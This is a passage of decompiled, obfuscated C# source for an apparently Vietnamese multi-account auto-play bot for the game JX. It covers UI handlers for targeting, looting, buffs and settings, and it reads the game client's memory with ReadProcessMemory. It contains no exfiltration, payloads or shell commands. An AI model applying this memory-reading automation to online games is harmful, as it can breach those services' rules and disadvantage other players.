										{
											if (characterAccountConfig3.bool_54)
											{
												color = Color.DarkGoldenrod;
											}
											else if (characterAccountConfig3.int_136 == Class46.characterSyncSnapshot_0.int_0)
											{
												color = Color.Blue;
											}
											else if (characterAccountConfig3.int_136 == Class81.characterAccountConfig_0.int_136)
											{
												color = Color.DarkViolet;
											}
										}
										else
										{
											color = Color.DarkCyan;
										}
									}
									else
									{
										color = Color.Purple;
									}
								}
								else
								{
									color = Color.DarkGray;
								}
							}
							else
							{
								color = Color.RoyalBlue;
							}
							if (listView1.Items[int_139].ForeColor != color)
							{
								listView1.Items[int_139].ForeColor = color;
							}
							if (int_139 == int_83 && bool_15)
							{
								uint[] array9 = Class38.smethod_30(characterAccountConfig3);
								if (array9 != null)
								{
									textBoxRealPosXY.Text = array9[0] + "," + array9[1];
									textBoxScrPosXY.Text = array9[0] / 256 + "," + array9[1] / 512;
								}
								uint num25 = Class89.smethod_6(characterAccountConfig3);
								textBoxRealMouseXY.Text = num25.ToString();
								uint num26 = num25 >> 16;
								uint num27 = num25 - (num26 << 16);
								textBoxScrMouseXY.Text = num27 + "," + num26;
								string text12 = Class39.smethod_0(characterAccountConfig3).ToString();
								if (textBoxMapId.Text != text12)
								{
									textBoxMapId.Text = text12;
								}
							}
							string text13 = "-1";
							if (Class46.characterSyncSnapshot_0.int_0 > 0 && num24 == Class46.characterSyncSnapshot_0.int_4)
							{
								if (Class46.characterSyncSnapshot_0.int_0 == characterAccountConfig3.int_136)
								{
									text13 = "0";
								}
								else
								{
									uint[] array10 = Class38.smethod_30(characterAccountConfig3);
									if (array10 != null)
									{
										long num28 = Class64.smethod_18(array10, Class46.characterSyncSnapshot_0.uint_4);
										text13 = ((int)Math.Sqrt(num28)).ToString();
									}
								}
							}
							if (characterAccountConfig3.long_6 == 0L)
							{
								characterAccountConfig3.long_6 = Class11.smethod_27();
							}
							if (Class11.smethod_28(characterAccountConfig3.long_6) > 5000L)
							{
								characterAccountConfig3.long_6 = Class11.smethod_27();
							}
							if (listView1.Items[int_139].SubItems[3].Text != text13)
							{
								listView1.Items[int_139].SubItems[3].Text = text13;
							}
						}
						goto IL_1fc0;
					}
					listView1.Items.RemoveAt(int_139);
					int_139 = 0;
					break;
				}
				int_139 = 0;
				break;
				IL_1fc0:
				int_139++;
				num19++;
			}
			while (num19 < 5);
		}
		else
		{
			int_144 = 0;
		}
		if (bool_26)
		{
			while (int_138 < listView1.Items.Count)
			{
				if (listView1.Items[int_138].Checked)
				{
					int_138++;
					continue;
				}
				listView1.Items[int_138].Checked = true;
				break;
			}
			if (listView1.Items.Count <= int_138)
			{
				bool_26 = false;
			}
		}
		if (int_132 != null && int_132.Length != 0 && listView1.Items != null && Class11.smethod_28(long_0) > 4000L)
		{
			int num29 = int_132[0];
			try
			{
				for (int num30 = 0; num30 < listView1.Items.Count; num30++)
				{
					int count = listView1.Items[num30].SubItems.Count;
					int num31 = Class11.smethod_11(listView1.Items[num30].SubItems[count - 1].Text);
					if (num29 == num31)
					{
						if (!listView1.Items[num30].Checked)
						{
							listView1.Items[num30].Checked = true;
						}
						long_0 = Class11.smethod_27();
						break;
					}
				}
			}
			catch
			{
			}
			Class11.smethod_39(ref int_132, num29);
		}
		if (!GClass1.bool_0)
		{
			return;
		}
		int_149++;
		if (int_149 > 100)
		{
			int num32 = 0;
			byte[] array11 = new byte[1];
			Class24.ReadProcessMemory(Class11.int_1, Class11.uint_1 + Class56.uint_4 * 4, array11, 1, ref num32);
			int num33 = array11[0];
			Class24.ReadProcessMemory(Class11.int_1, Class11.uint_1 + Class56.uint_5 * 4, array11, 1, ref num32);
			int num34 = array11[0];
			if (num33 > 0)
			{
				buttonAdd.BackColor = Color.Red;
			}
			else if (num34 == 0)
			{
				buttonAdd.BackColor = Color.DarkRed;
			}
			int_149 = 0;
		}
	}

	private void method_8()
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		string[] array = new string[2] { "TAT", "BAT" };
		string[] array2 = new string[2] { "<color=pink>", "<color=green>" };
		string text = null;
		string text2 = null;
		if (!bool_31)
		{
			text = "®\u00b8nh ng\u00adêi ( F8) => " + array[int_34];
			text2 = "<color=white>§\u00b8nh ng\u00adêi ( F8): " + array2[int_34] + array[int_34];
		}
		else
		{
			text = "®\u00b8nh qu\u00b8i ( F7) => " + array[int_35];
			text2 = "<color=yellow>§\u00b8nh qu\u00b8i. ( F7): " + array2[int_35] + array[int_35];
		}
		Class28.string_0 = text;
		Class28.long_0 = DateTime.Now.AddSeconds(6.0).Ticks;
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			try
			{
				if (characterAccountConfig_1[i].bool_25)
				{
					Class38.smethod_10(characterAccountConfig_1[i], 0u);
					int num = 0;
					while (Class28.int_0 > 0 && num < 20)
					{
						Thread.Sleep(10);
						num++;
					}
					Class75.smethod_52(characterAccountConfig_1[i], text2);
					Class28.int_0 = characterAccountConfig_1[i].int_137;
					Class28.uint_2 = characterAccountConfig_1[i].uint_16;
					new Thread(Class28.smethod_6).Start();
				}
			}
			catch
			{
			}
		}
	}

	private void buttonAdd_Click(object sender, EventArgs e)
	{
        ThemXoaDanhsach themXoaDanhsach = new ThemXoaDanhsach();
        themXoaDanhsach.int_2 = base.Left;
        themXoaDanhsach.int_3 = base.Top;
        themXoaDanhsach.int_4 = base.Width;
        themXoaDanhsach.int_5 = base.Height;
        themXoaDanhsach.Show();
        return;
    }

	private void buttonBrowseGame_Click(object sender, EventArgs e)
	{
		string text = Class56.string_8;
		string text2 = string.Empty;
		string text3 = Class56.smethod_0();
		if (text3 == null || text3 == string.Empty)
		{
			text3 = Class66.smethod_7("PathGame", 0);
		}
		if (text3 != null && text3 != string.Empty)
		{
			string[] array = Class11.smethod_14(text3);
			text = array[0];
			text2 = array[1];
		}
		string text4 = "Game.exe";
		if (string_7 != null && 0 <= int_4 && int_4 < string_7.GetLength(0) && string_7[int_4, 4] != null && string_7[int_4, 4] != string.Empty)
		{
			text4 = string_7[int_4, 4].Split('/')[0];
		}
		string text5 = "*.exe|*.exe|Game.exe|Game.exe|Games.exe|Games.exe|vlbs.exe|vlbs.exe|Game.dat|Game.dat";
		if (text4 != null)
		{
			text5 = text4 + "|" + text4 + "|" + text5;
		}
		string text6 = Class56.smethod_26(text, text2, "*.exe", text5);
		if (text6 != null && !(text6 == string.Empty))
		{
			string[] array2 = Class11.smethod_14(text6);
			Class56.string_18 = array2[0];
			Class56.string_19 = array2[1];
			Class24.smethod_71(text6, bool_0: false);
			Class66.smethod_11(Class66.smethod_1(), "PathGame", text6, "", 0);
			textBoxThuMuc.Text = text6;
			Class2.string_0 = text6;
		}
	}

	private void buttonToShortcut_Click(object sender, EventArgs e)
	{
		Class24.smethod_74("AutoKeoxe");
		method_2("Đã tạo shortcut auto lên desktop.");
	}

	private void buttonThumucAuto_Click(object sender, EventArgs e)
	{
		string environmentVariable = Environment.GetEnvironmentVariable(Class11.smethod_0(Class56.char_0));
		Class24.smethod_40(environmentVariable + "\\explorer.exe", Class56.string_8, Class56.string_8, 0);
	}

	private void checkBoxPhimTat_CheckedChanged(object sender, EventArgs e)
	{
		if (bool_23)
		{
			int_69 = Convert.ToByte(checkBoxPhimTat.Checked);
			Class66.smethod_11(Class66.smethod_1(), "flagPhimtat", int_69, "", 0);
		}
	}

	private void notifyIcon_0_MouseClick(object sender, MouseEventArgs e)
	{
		Show();
		base.WindowState = FormWindowState.Normal;
		notifyIcon_0.Visible = false;
	}

	private void buttonDangky_Click(object sender, EventArgs e)
	{
		string text = "Hãy chọn 1 ac trước đã rồi bấm nút!";
		bool flag = false;
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (0 <= num)
		{
			CharacterAccountConfig characterAccountConfig = characterAccountConfig_1[num];
			string text2 = Class28.smethod_10(characterAccountConfig);
			string text3 = Class89.smethod_16(characterAccountConfig);
			int[] array = new int[1] { characterAccountConfig.int_136 };
			TcpConnectionEntry[] array2 = Class51.smethod_0(array);
			string text4 = string.Empty;
			if (array2 != null)
			{
				for (int i = 0; i < array2.Length; i++)
				{
					if (characterAccountConfig.int_136 == array2[i].int_0 && array2[i].string_2 != null && array2[i].string_2 != string.Empty)
					{
						if (text4 != string.Empty)
						{
							text4 += ",";
						}
						text4 += array2[i].string_2.Replace(" ", string.Empty);
					}
				}
			}
			text = "Tên ac: " + Class1.smethod_1(characterAccountConfig.string_22, 1) + "|Tên bang hội:|" + text2 + "|Tên server:|" + text3 + "|" + text4;
			text = text + "||Sign:|" + Class11.smethod_16(text);
			flag = true;
		}
		FormTip.smethod_0("Bang hội", text, 300000, 230, 140, bool_8: false, -1, -1, flag);
		try
		{
			string text5 = richTextBoxBHO.Text;
			if (text5.IndexOf("\r") < 0)
			{
				text5 = text5.Replace("\n", "\r\n");
			}
			Clipboard.SetText("<3 " + text5);
		}
		catch
		{
		}
	}

	private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left && characterAccountConfig_1 != null && characterAccountConfig_1.Length != 0 && int_83 >= 0 && int_83 < listView1.Items.Count)
		{
			uint_3 = characterAccountConfig_1[int_83].uint_4;
			new Thread(method_10).Start();
		}
	}

	private void listView1_MouseUp(object sender, MouseEventArgs e)
	{
		bool_21 = false;
		if (e.Button == MouseButtons.Right && characterAccountConfig_1 != null && characterAccountConfig_1.Length != 0 && int_83 >= 0 && int_83 < listView1.Items.Count)
		{
			uint_2 = characterAccountConfig_1[int_83].uint_4;
			new Thread(method_9).Start();
		}
	}

	private void method_9()
	{
		uint num = uint_2;
		if (num != 0)
		{
			Class24.ShowWindow(num, Class24.int_26);
			Thread.Sleep(100);
			Class24.ShowWindow(num, Class24.int_24);
		}
	}

	private void method_10()
	{
		uint num = uint_3;
		if (num != 0)
		{
			Class24.ShowWindow(num, Class24.int_27);
			Class24.ShowWindow(num, Class24.int_25);
			Thread.Sleep(200);
			Class24.SetForegroundWindow(num);
		}
	}

	private void method_11()
	{
		uint num = uint_4;
		if (num != 0)
		{
			Class24.ShowWindow(num, Class24.int_26);
		}
	}

	private void listView1_ItemCheck(object sender, ItemCheckEventArgs e)
	{
		if (bool_21)
		{
			e.NewValue = e.CurrentValue;
			return;
		}
		int num = Class87.smethod_9(listView1, e.Index);
		if (num != 0)
		{
			int num2 = Class87.smethod_3(characterAccountConfig_1, num);
			if (num2 >= 0)
			{
				if (e.NewValue != CheckState.Unchecked && Class56.bool_1)
				{
					characterAccountConfig_1[num2].bool_25 = true;
					characterAccountConfig_1[num2].long_8 = Class11.smethod_27();
					Class11.smethod_38(ref Class80.int_1, characterAccountConfig_1[num2].int_136);
				}
				else
				{
					characterAccountConfig_1[num2].bool_25 = false;
					e.NewValue = CheckState.Unchecked;
				}
			}
			else
			{
				listView1.Items.RemoveAt(e.Index);
			}
		}
		else
		{
			listView1.Items.RemoveAt(e.Index);
		}
	}

	private void checkBoxChatNham_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_72 = Convert.ToByte(checkBoxChatNham.Checked);
		Class66.smethod_11(Class66.smethod_1(), "flagChatNhamEx", int_72, "", 0);
		if (int_72 > 0 && string_24.ToLower() == "item")
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (0 <= num)
			{
				string text = Class85.smethod_43(characterAccountConfig_1[num]);
				string text2 = Class11.smethod_16(text);
				Class11.smethod_34("ItemName.txt", text + Class56.string_7 + "==================================" + Class56.string_7 + text2, 1);
			}
		}
	}

	private void textBoxChatNham_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			string_24 = textBoxChatNham.Text;
			Class66.smethod_11(Class66.smethod_1(), "textChatNhams", string_24, "", 0);
		}
	}

	private void buttonCapnhat_Click(object sender, EventArgs e)
	{
		if (TryNewVersion.bool_0)
		{
			TryNewVersion.bool_0 = false;
			return;
		}
		try
		{
			TryNewVersion tryNewVersion = new TryNewVersion();
			tryNewVersion.int_2 = base.Left;
			tryNewVersion.int_3 = base.Top;
			tryNewVersion.int_4 = base.Width;
			tryNewVersion.int_5 = base.Height;
			tryNewVersion.Show();
		}
		catch
		{
		}
	}

	private void buttonIDApdung_Click(object sender, EventArgs e)
	{
		string text = textBoxIDSudung.Text;
		if (!(text == string_15))
		{
			string_15 = text.Trim();
			GClass1.int_2 = 2;
			Class66.smethod_11(Class66.smethod_1(), "textIDSudung", string_15, "", 0);
			richTextBoxBHO.Text = "Auto Free 100% cho JX Offline by MEL";
		}
	}

	private void buttonTrial_Click(object sender, EventArgs e)
	{
		if (!(string_13 == string_15))
		{
			string_15 = string_13;
			GClass1.int_2 = 2;
			Class66.smethod_11(Class66.smethod_1(), "textIDSudung", string_15, "", 0);
			textBoxIDSudung.Text = string_15;
			richTextBoxBHO.Text = "Auto Free 100% cho JX Offline by MEL";
		}
	}

	private void checkBoxTimAccchinh_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_25 = Convert.ToByte(checkBoxTimAccchinh.Checked);
		Class66.smethod_11(Class66.smethod_1(), "flagTimAccchinh", int_25, "", 0);
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				Class13.smethod_2(characterAccountConfig_1[i], bool_0: false);
				Class38.smethod_10(characterAccountConfig_1[i], 0u);
			}
		}
	}

	private void checkBoxTimTrongthanh_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_26 = Convert.ToByte(checkBoxTimTrongthanh.Checked);
		Class66.smethod_11(Class66.smethod_1(), "flagTimtrongthanh", int_26, "", 0);
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (characterAccountConfig_1[i].bool_25)
			{
				Class13.smethod_2(characterAccountConfig_1[i], bool_0: false);
				Class38.smethod_10(characterAccountConfig_1[i], 0u);
			}
		}
	}

	private void comboBoxAccChinh_MouseDown(object sender, MouseEventArgs e)
	{
		bool_32 = true;
		if (characterAccountConfig_1 != null)
		{
			bool flag = false;
			comboBoxAccChinh.Items.Clear();
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				if (string_22 == Class1.smethod_1(characterAccountConfig_1[i].string_22, 1))
				{
					flag = true;
				}
				comboBoxAccChinh.Items.Add(Class1.smethod_1(characterAccountConfig_1[i].string_22, 1));
			}
			if (!flag && string_22 != string.Empty)
			{
				comboBoxAccChinh.Items.Add(string_22);
			}
			comboBoxAccChinh.Text = string_22;
		}
		bool_32 = false;
	}

	private void comboBoxAccChinh_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (bool_32)
		{
			return;
		}
		string_22 = comboBoxAccChinh.Text;
		if (string_22 != null && !(string_22 == string.Empty) && characterAccountConfig_1 != null && characterAccountConfig_1.Length != 0)
		{
			int num = 0;
			while (true)
			{
				if (num < characterAccountConfig_1.Length)
				{
					if (string_22 == Class1.smethod_1(characterAccountConfig_1[num].string_22, 1))
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			int_58 = characterAccountConfig_1[num].int_136;
		}
		else
		{
			int_58 = 0;
		}
		Class66.smethod_11(Class66.smethod_1(), "AccChinhNameA", Class11.smethod_16(string_22), "", 0);
		if (!toadotk.Checked || comboBoxAccChinh.SelectedIndex < 0)
		{
			return;
		}
		bool_4 = false;
		uint_0 = null;
		object selectedItem = comboBoxAccChinh.SelectedItem;
		object obj;
		if (selectedItem == null)
		{
			obj = null;
		}
		else
		{
			obj = selectedItem.ToString();
			if (obj != null)
			{
				goto IL_010b;
			}
		}
		obj = "Unknown";
		goto IL_010b;
		IL_010b:
		string text = (string)obj;
		richTextBoxStatus.Text = "Đã chuyển sang tài khoản: " + text + " - Hệ thống sẽ bắt đầu theo dõi vị trí mới";
	}

	private void buttonOff_Click(object sender, EventArgs e)
	{
		long_4 = method_12();
		long_3 = Class11.smethod_27();
	}

	private int method_12()
	{
		if (Class26.gstruct14_0 == null)
		{
			return 3000;
		}
		int num = 0;
		do
		{
			num++;
			int_145++;
			if (int_145 < 0 || Class26.gstruct14_0.Length <= int_145)
			{
				int_145 = 0;
			}
			GStruct14 gStruct = Class26.gstruct14_0[int_145];
			if (gStruct.string_0 == null || gStruct.string_0 == string.Empty || gStruct.bool_0)
			{
				continue;
			}
			int num2 = gStruct.int_1;
			if (num2 < 1000)
			{
				num2 = 30000;
			}
			if (gStruct.int_0 <= 0)
			{
				pictureBoxQC.Visible = true;
				richTextBoxStatus.Visible = false;
				if (pictureBoxQC.ImageLocation != gStruct.string_0)
				{
					pictureBoxQC.ImageLocation = gStruct.string_0;
				}
			}
			else
			{
				richTextBoxStatus.Visible = true;
				pictureBoxQC.Visible = false;
				richTextBoxStatus.Text = gStruct.string_2;
			}
			return num2;
		}
		while (Class26.gstruct14_0.Length > num);
		return 1000;
	}

	private void buttonFormTest_Click(object sender, EventArgs e)
	{
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			FormTest.characterAccountConfig_0 = characterAccountConfig_1[num];
		}
		FormTest.bool_1 = true;
		if (!FormTest.bool_0)
		{
			FormTest formTest = new FormTest();
			formTest.int_3 = int_52[0];
			formTest.int_4 = int_52[1];
			formTest.int_1 = base.Left;
			formTest.int_2 = base.Top;
			formTest.Show();
		}
	}

	private void buttonTest_Click(object sender, EventArgs e)
	{
	}

	private void checkBoxTuve_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_34 = Convert.ToByte(checkBoxTuve.Checked);
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class38.smethod_10(characterAccountConfig_1[i], 0u);
			}
		}
		Class66.smethod_11(Class66.smethod_1(), "flagDanhnguoi", int_34, "", 0);
	}

	private void checkBoxDanhquai_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_35 = Convert.ToByte(checkBoxDanhquai.Checked);
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class38.smethod_10(characterAccountConfig_1[i], 0u);
			}
		}
		Class66.smethod_11(Class66.smethod_1(), "flagDanhquai", int_35, "", 0);
	}

	private void method_13(CharacterAccountConfig[] characterAccountConfig_2, int int_159, string string_69 = "log.txt")
	{
		try
		{
			using (new StreamWriter(string_69, append: true, Encoding.UTF8))
			{
				if (int_159 < 0 || int_159 >= characterAccountConfig_2.Length || characterAccountConfig_2[int_159].gstruct40_0 == null || characterAccountConfig_2[int_159].gstruct40_0.Length == 0)
				{
				}
				for (int i = 0; i < characterAccountConfig_2.Length; i++)
				{
					if (characterAccountConfig_2[i].gstruct40_0 == null || characterAccountConfig_2[i].gstruct40_0.Length == 0)
					{
					}
				}
				if (listView1.Items.Count > 0)
				{
					foreach (ListViewItem item in listView1.Items)
					{
						List<string> list = new List<string>();
						for (int j = 0; j < item.SubItems.Count; j++)
						{
							string text = item.SubItems[j].Text;
							if (j == 0)
							{
								text = Encoding.UTF8.GetString(Encoding.Default.GetBytes(text));
							}
							list.Add(text);
						}
					}
				}
				if (characterAccountConfig_2.Length == 0 || characterAccountConfig_2[0].process_0 == null || characterAccountConfig_2[0].process_0.HasExited)
				{
				}
				try
				{
					if (characterAccountConfig_2.Length != 0 && !string.IsNullOrEmpty(characterAccountConfig_2[0].string_17))
					{
						Class11.smethod_11(characterAccountConfig_2[0].string_17);
						using (new StreamWriter("class.ProcessAutoMedicineUsageInternal.txt", append: true, Encoding.UTF8))
						{
							return;
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void checkBoxUutienDanhquai_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int_36 = Convert.ToByte(checkBoxUutienDanhquai.Checked);
		Class66.smethod_11(Class66.smethod_1(), "flagUutienBoss", int_36, "", 0);
		if (int_36 > 0 && int_35 == 0)
		{
			checkBoxDanhquai.Checked = true;
			int_35 = 1;
		}
		checkBoxDanhquai.Enabled = int_36 == 0;
		if (characterAccountConfig_1 != null)
		{
			for (int i = 0; i < characterAccountConfig_1.Length; i++)
			{
				Class38.smethod_10(characterAccountConfig_1[i], 0u);
			}
		}
	}

	private void checkBoxTiepCan_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_95 = Convert.ToByte(checkBoxTiepCan.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void checkBoxTamQuet_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (characterAccountConfig_1 != null && num >= 0 && num < characterAccountConfig_1.Length)
		{
			characterAccountConfig_1[num].int_98 = Convert.ToByte(checkBoxTamQuet.Checked);
			if (characterAccountConfig_1[num].byte_0 != null)
			{
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxKhoangCachTiepcan_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (characterAccountConfig_1 != null && num >= 0 && num < characterAccountConfig_1.Length)
		{
			int num2 = Class11.smethod_11(textBoxKhoangCachTiepcan.Text);
			if (num2 < 1)
			{
				num2 = 1;
			}
			else if (num2 > 1000)
			{
				num2 = 1000;
			}
			characterAccountConfig_1[num].int_96 = num2;
			if (characterAccountConfig_1[num].byte_0 != null && characterAccountConfig_1[num].byte_0.Length != 0 && characterAccountConfig_1[num].process_0 != null && !characterAccountConfig_1[num].process_0.HasExited)
			{
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxPhamvi_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxPhamvi.Text);
			if (num2 < 1)
			{
				num2 = 1;
			}
			else if (num2 > 1000)
			{
				num2 = 1000;
			}
			characterAccountConfig_1[num].int_99 = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxChetnamIm_CheckedChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Convert.ToByte(checkBoxChetnamIm.Checked);
		if (int_42 > 0)
		{
			int_41 = num;
			return;
		}
		int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num2 >= 0)
		{
			characterAccountConfig_1[num2].int_94 = num;
			Class56.smethod_13(characterAccountConfig_1[num2]);
		}
	}

	private void checkBoxNgamyBuff_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_101[0] = Convert.ToByte(checkBoxNgamyBuff.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxNgamyBuff_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_101[3] = Class11.smethod_11(textBoxNgamyBuff.Text);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void textBoxtimettl_TextChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled)
		{
			int_130 = Class11.smethod_11(textBoxtimettl.Text);
			if (int_130 <= 0)
			{
				int_130 = 1;
			}
			Class66.smethod_11(Class66.smethod_1(), "ThoiGianTTL", int_130, "", 0);
		}
	}

	private void textBoxTimerNgamyBuff_TextChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num >= 0)
		{
			int num2 = Class11.smethod_11(textBoxTimerNgamyBuff.Text);
			if (num2 < 100)
			{
				num2 = 100;
			}
			characterAccountConfig_1[num].int_101[4] = num2;
			Class56.smethod_13(characterAccountConfig_1[num]);
		}
	}

	private void checkBoxTuCastBua_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_119 = Convert.ToByte(checkBoxTuCastBua.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void buttonCashBua_Click(object sender, EventArgs e)
	{
		if (FormMagic.bool_0)
		{
			FormMagic.bool_0 = false;
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		FormMagic.int_0 = characterAccountConfig_1[num].int_136;
		FormMagic.string_0 = Class83.smethod_18(characterAccountConfig_1[num]);
		try
		{
			new FormMagic().Show();
		}
		catch
		{
		}
	}

	private void buttonLoaitruAccBuff_Click(object sender, EventArgs e)
	{
		if (FormLoaitru.bool_0)
		{
			FormLoaitru.bool_0 = false;
			return;
		}
		try
		{
			FormLoaitru formLoaitru = new FormLoaitru();
			formLoaitru.int_0 = Cursor.Position.X;
			formLoaitru.int_1 = Cursor.Position.Y;
			formLoaitru.int_2 = base.Width;
			formLoaitru.int_3 = base.Height;
			formLoaitru.Show();
		}
		catch
		{
		}
	}

	private void comboBoxNhatdo_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num < 0)
		{
			return;
		}
		string text = comboBoxNhatdo.Text;
		for (int i = 0; i < string_28.Length; i++)
		{
			if (string_28[i] == text)
			{
				characterAccountConfig_1[num].int_62 = i;
				Class56.smethod_13(characterAccountConfig_1[num]);
				break;
			}
		}
	}

	private void checkBoxNhatdo_CheckedChanged(object sender, EventArgs e)
	{
		if (timer_3.Enabled && bool_23)
		{
			int num = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
			if (num >= 0)
			{
				characterAccountConfig_1[num].int_61 = Convert.ToByte(checkBoxNhatdo.Checked);
				Class56.smethod_13(characterAccountConfig_1[num]);
			}
		}
	}

	private void comboBoxAccDoiMau_MouseDown(object sender, MouseEventArgs e)
	{
		if (characterAccountConfig_1 == null)
		{
			return;
		}
		bool_32 = true;
		bool flag = false;
		string text = comboBoxAccDoiMau.Text;
		comboBoxAccDoiMau.Items.Clear();
		comboBoxAccDoiMau.Items.Add("...");
		for (int i = 0; i < characterAccountConfig_1.Length; i++)
		{
			if (text == Class1.smethod_1(characterAccountConfig_1[i].string_22, 1))
			{
				flag = true;
			}
			comboBoxAccDoiMau.Items.Add(Class1.smethod_1(characterAccountConfig_1[i].string_22, 1));
		}
		if (!flag && text != "" && text != "...")
		{
			comboBoxAccDoiMau.Items.Add(text);
		}
		comboBoxAccDoiMau.Text = text;
		bool_32 = false;
	}

	private void comboBoxAccDoiMau_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23 || bool_32)
		{
			return;
		}
		FormDoiMauBang.gstruct2_0.uint_0 = 0u;
		string text = comboBoxAccDoiMau.Text;
		int num;
		if (characterAccountConfig_1 != null && text != null && text != string.Empty)
		{
			num = 0;
			while (num < characterAccountConfig_1.Length)
			{
				if (!(text == Class1.smethod_1(characterAccountConfig_1[num].string_22, 1)))
				{
					num++;
					continue;
				}
				goto IL_008d;
			}
		}
		FormDoiMauBang.gstruct2_0.string_0 = "...";
		FormDoiMauBang.gstruct2_0.characterAccountConfig_0 = new CharacterAccountConfig
		{
			int_136 = 0
		};
		goto IL_00f0;
		IL_00f0:
		Class66.smethod_11(Class66.smethod_1(), "TenAccdoiMau", Class11.smethod_16(FormDoiMauBang.gstruct2_0.string_0), "", 0);
		return;
		IL_008d:
		FormDoiMauBang.gstruct2_0.characterAccountConfig_0 = characterAccountConfig_1[num];
		FormDoiMauBang.gstruct2_0.string_0 = Class1.smethod_1(characterAccountConfig_1[num].string_22, 1);
		goto IL_00f0;
	}

	private void comboBoxUuTien_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (!timer_3.Enabled || !bool_23)
		{
			return;
		}
		int num = -1;
		string text = comboBoxUuTien.Text;
		for (int i = 0; i < string_30.Length; i++)
		{
			if (text == string_30[i])
			{
				num = i;
				break;
			}
		}
		if (num < 0)
		{
			return;
		}
		if ((num == 1 || num == 2) && !checkBox2.Checked)
		{
			string text2 = ((num == 1) ? "Ngũ hành" : "Môn phái");
			MessageBox.Show("Vui lòng tick vào checkbox 'Ngũ hành' trong tab Ưu tiên trước khi sử dụng chế độ " + text2 + "!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			comboBoxUuTien.Text = string_30[0];
			return;
		}
		int num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
		if (num2 < 0)
		{
			return;
		}
		string text3 = "";
		switch (num)
		{
		case 0:
			buttonUuTien.Text = "Áp dụng";
			characterAccountConfig_1[num2].int_143 = 0;
			text3 = "<color=green>ChÕ ®é : Kho¶ng C\u00b8ch";
			if (timer_3.Enabled && bool_23)
			{
